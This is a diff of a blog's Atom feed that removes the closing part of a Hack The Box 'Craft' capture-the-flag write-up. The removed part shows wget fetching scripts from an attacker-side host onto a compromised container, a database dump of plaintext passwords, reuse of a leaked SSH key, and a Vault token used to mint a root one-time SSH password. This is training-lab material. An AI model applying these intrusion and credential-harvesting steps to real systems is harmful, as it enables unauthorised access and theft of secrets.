-                             &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MYSQL_DATABASE_PASSWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                             &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MYSQL_DATABASE_DB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                             &lt;span class=&quot;n&quot;&gt;cursorclass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pymysql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cursors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DictCursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
-    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SHOW TABLES&quot;&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fetchall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;There were two tables, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brew&lt;/code&gt;:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/opt/app # wget http://10.10.xx.xx/db1.py
-Connecting to 10.10.xx.xx (10.10.xx.xx:80)
-db1.py               100% |********************************|   629  0:00:00 ETA
-
-/opt/app # python db1.py
-[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
-/opt/app # rm db1.py
-/opt/app #
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;I changed the query to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT * FROM user&lt;/code&gt;:&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python
-&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pymysql&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;craft_api&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;# test connection to mysql database
-&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pymysql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MYSQL_DATABASE_HOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                             &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MYSQL_DATABASE_USER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                             &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MYSQL_DATABASE_PASSWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                             &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MYSQL_DATABASE_DB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                             &lt;span class=&quot;n&quot;&gt;cursorclass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pymysql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cursors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DictCursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
-    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SELECT * FROM user&quot;&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fetchall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;The table had all users credentials stored in plain text:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/opt/app # wget http://10.10.xx.xx/db2.py
-Connecting to 10.10.xx.xx (10.10.xx.xx:80)
-db2.py               100% |********************************|   636  0:00:00 ETA
-
-/opt/app # python db2.py
-[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
-/opt/app # rm db2.py
-/opt/app #
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Gilfoyle had a private repository called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;craft-infra&lt;/code&gt;:
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/craft/16.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/craft/17.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
-He left his private &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt; key in the repository:
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/craft/18.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/craft/19.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
-When I tried to use the key it asked for password as it was encrypted, I tried his &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gogs&lt;/code&gt; password (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ZEU3N8WNM2rh4T&lt;/code&gt;) and it worked:
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/craft/20.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
-We owned user.&lt;br /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;vault--one-time-ssh-password--ssh-as-root--root-flag&quot;&gt;Vault –&amp;gt; One-Time SSH Password –&amp;gt; SSH as root –&amp;gt; Root Flag&lt;/h2&gt;
-&lt;p&gt;In Gilfoyle’s home directory there was a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.vault-token&lt;/code&gt;:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gilfoyle@craft:~$ ls -la
-total 44
-drwx------ 5 gilfoyle gilfoyle 4096 Jan  3 13:42 .
-drwxr-xr-x 3 root     root     4096 Feb  9  2019 ..
--rw-r--r-- 1 gilfoyle gilfoyle  634 Feb  9  2019 .bashrc
-drwx------ 3 gilfoyle gilfoyle 4096 Feb  9  2019 .config
-drwx------ 2 gilfoyle gilfoyle 4096 Jan  3 13:31 .gnupg
--rw-r--r-- 1 gilfoyle gilfoyle  148 Feb  8  2019 .profile
-drwx------ 2 gilfoyle gilfoyle 4096 Feb  9  2019 .ssh
--r-------- 1 gilfoyle gilfoyle   33 Feb  9  2019 user.txt
--rw------- 1 gilfoyle gilfoyle   36 Feb  9  2019 .vault-token
--rw------- 1 gilfoyle gilfoyle 5091 Jan  3 13:28 .viminfo
-gilfoyle@craft:~$ cat .vault-token 
-f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle@craft:~$
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;A quick search revealed that it’s related to &lt;a href=&quot;https://www.vaultproject.io/&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vault&lt;/code&gt;&lt;/a&gt;.&lt;br /&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Secure, store and tightly control access to tokens, passwords, certificates, encryption keys for protecting secrets and other sensitive data using a UI, CLI, or HTTP API. -&lt;a href=&quot;https://www.vaultproject.io/&quot;&gt;vaultproject.io&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;By looking at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vault.sh&lt;/code&gt; from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;craft-infra&lt;/code&gt; repository (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vault/vault.sh&lt;/code&gt;), we’ll see that it enables the &lt;a href=&quot;https://www.vaultproject.io/docs/secrets/ssh/index.html&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt; secrets engine&lt;/a&gt; then creates an &lt;a href=&quot;https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;otp&lt;/code&gt; role&lt;/a&gt; for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-
-&lt;span class=&quot;c&quot;&gt;# set up vault secrets backend&lt;/span&gt;
-
-vault secrets &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;ssh
-
-vault write ssh/roles/root_otp &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;key_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;otp &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;default_user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;root &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;cidr_list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.0.0.0/0
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;We have the token (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.vault-token&lt;/code&gt;) so we can easily authenticate to the vault and create an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;otp&lt;/code&gt; for a root &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt; session:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gilfoyle@craft:~$ vault login
-Token (will be hidden): 
-Success! You are now authenticated. The token information displayed below
-is already stored in the token helper. You do NOT need to run &quot;vault login&quot;
-again. Future Vault requests will automatically use this token.
-
-Key                  Value
----                  -----
-token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
-token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103
-token_duration       ∞
-token_renewable      false
-token_policies       [&quot;root&quot;]
-identity_policies    []
-policies             [&quot;root&quot;]
-gilfoyle@craft:~$ vault write ssh/creds/root_otp ip=127.0.0.1
-Key                Value
----                -----
-lease_id           ssh/creds/root_otp/f17d03b6-552a-a90a-02b8-0932aaa20198
-lease_duration     768h
-lease_renewable    false
-ip                 127.0.0.1
-key                c495f06b-daac-8a95-b7aa-c55618b037ee
-key_type           otp
-port               22
-username           root
-gilfoyle@craft:~$
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;And finally we’ll &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt; into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;localhost&lt;/code&gt; and use the generated password (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c495f06b-daac-8a95-b7aa-c55618b037ee&lt;/code&gt;):&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gilfoyle@craft:~$ ssh root@127.0.0.1
-
-
-  .   *   ..  . *  *
-*  * @()Ooc()*   o  .
-    (Q@*0CG*O()  ___
-   |\_________/|/ _ \
-   |  |  |  |  | / | |
-   |  |  |  |  | | | |
-   |  |  |  |  | | | |
-   |  |  |  |  | | | |
-   |  |  |  |  | | | |
-   |  |  |  |  | \_| |
-   |  |  |  |  |\___/
-   |\_|__|__|_/|
-    \_________/
-
-
-
-Password: 
-Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Tue Aug 27 04:53:14 2019
-root@craft:~# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/craft/21.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
-And we owned root !
-&lt;br /&gt;That’s it , Feedback is appreciated !
-&lt;br /&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;
-&lt;br /&gt;Thanks for reading.&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/smasher2/&quot;&gt;Hack The Box - Smasher2&lt;/a&gt;
-&lt;br /&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/bitlab/&quot;&gt;Hack The Box - Bitlab&lt;/a&gt;&lt;/p&gt;</content><author><name>0xRick</name></author><category term="hack-the-box" /><category term="linux" /><category term="web" /><category term="ssh" /><category term="rce" /><category term="python" /><category term="code-analysis" /><summary type="html">Hack The Box - Craft</summary></entry></feed>
+&lt;br /&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/player/&quot;&gt;Hack The Box - Player&lt;/a&gt;&lt;/p&gt;</content><author><name>0xRick</name></author><category term="hack-the-box" /><category term="linux" /><category term="web" /><category term="ssh" /><category term="rce" /><category term="php" /><category term="reverse-engineering" /><category term="git" /><category term="postgresql" /><summary type="html">Hack The Box - Bitlab</summary></entry></feed>
